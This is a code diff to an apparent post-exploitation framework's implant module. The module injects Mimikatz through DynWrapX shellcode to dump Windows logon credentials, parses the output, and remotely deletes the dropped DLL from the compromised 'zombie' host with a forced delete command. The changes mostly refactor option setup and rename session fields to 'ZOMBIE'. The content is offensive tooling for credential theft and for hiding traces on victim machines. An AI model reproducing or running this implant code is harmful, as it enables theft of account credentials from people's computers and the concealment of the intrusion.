@@ -4,11 +4,20 @@ import core.cred_parser
 import string
 import collections
 import time
+import uuid
 
 class DynWrapXShellcodeJob(core.job.Job):
     def create(self):
         self.fork32Bit = True
         self.errstat = 0
+        self.options.set("DLLUUID", uuid.uuid4().hex)
+        self.options.set("MANIFESTUUID", uuid.uuid4().hex)
+        self.options.set("SHIMX64UUID", uuid.uuid4().hex)
+        self.options.set("MIMIX64UUID", uuid.uuid4().hex)
+        self.options.set("MIMIX86UUID", uuid.uuid4().hex)
+        self.options.set("MIMICMD", self.options.get("MIMICMD").lower())
+        self.options.set("SHIMX86BYTES", self.make_arrDLL(self.options.get("SHIMX86DLL")))
+        self.options.set("DIRECTORY", self.options.get('DIRECTORY').replace("\\", "\\\\").replace('"', '\\"'))
 
     def parse_mimikatz(self, data):
         cp = core.cred_parser.CredParse(self)
@@ -63,14 +72,14 @@ class DynWrapXShellcodeJob(core.job.Job):
         # deleting dynwrapx.dll, i hate this
         time.sleep(1)
         plugin = self.shell.plugins['implant/manage/exec_cmd']
-        old_session = plugin.options.get("session")
+        old_zombie = plugin.options.get("ZOMBIE")
         old_cmd = plugin.options.get("CMD")
         old_output = plugin.options.get("OUTPUT")
-        plugin.options.set("session", self.options.get("session"))
+        plugin.options.set("ZOMBIE", self.options.get("ZOMBIE"))
         plugin.options.set("CMD", "del /f "+self.options.get("DIRECTORY")+"\\dynwrapx.dll & echo done")
         plugin.options.set("OUTPUT", "true")
         plugin.run()
-        plugin.options.set("session", old_session)
+        plugin.options.set("ZOMBIE", old_zombie)
         plugin.options.set("CMD", old_cmd)
         plugin.options.set("OUTPUT", old_output)
 
@@ -88,7 +97,7 @@ class DynWrapXShellcodeImplant(core.implant.Implant):
     STATE = "implant/inject/mimikatz_dynwrapx"
 
     def load(self):
-        self.options.register("DIRECTORY", "%TEMP%", "Writeable directory on session.", required=False)
+        self.options.register("DIRECTORY", "%TEMP%", "Writeable directory on zombie.", required=False)
 
         self.options.register("MIMICMD", "sekurlsa::logonpasswords", "What Mimikatz command to run?", required=True)
 
@@ -102,7 +111,7 @@ class DynWrapXShellcodeImplant(core.implant.Implant):
 
         self.options.register("UUIDHEADER", "ETag", "HTTP header for UUID.", advanced=True)
 
-        self.options.register("DLLUUID", "", "HTTP header for UUID.", hidden=True)
+        self.options.register("DLLUUID", "", "HTTP header for UUID", hidden=True)
         self.options.register("MANIFESTUUID", "", "UUID.", hidden=True)
         self.options.register("SHIMX64UUID", "", "UUID.", hidden=True)
         self.options.register("MIMIX64UUID", "", "UUID.", hidden=True)
@@ -133,22 +142,7 @@ class DynWrapXShellcodeImplant(core.implant.Implant):
         return ret[:-1] # strip last comma
 
     def run(self):
-
-        import uuid
-        self.options.set("DLLUUID", uuid.uuid4().hex)
-        self.options.set("MANIFESTUUID", uuid.uuid4().hex)
-        self.options.set("SHIMX64UUID", uuid.uuid4().hex)
-        self.options.set("MIMIX64UUID", uuid.uuid4().hex)
-        self.options.set("MIMIX86UUID", uuid.uuid4().hex)
-
-        self.options.set("MIMICMD", self.options.get("MIMICMD").lower())
-
-
-        self.options.set("SHIMX86BYTES", self.make_arrDLL(self.options.get("SHIMX86DLL")))
-        self.options.set("DIRECTORY", self.options.get('DIRECTORY').replace("\\", "\\\\").replace('"', '\\"'))
-
-
         workloads = {}
-        workloads["js"] = self.loader.load_script("data/implant/inject/mimikatz_dynwrapx.js", self.options)
+        workloads["js"] = "data/implant/inject/mimikatz_dynwrapx.js"
 
         self.dispatch(workloads, self.job)
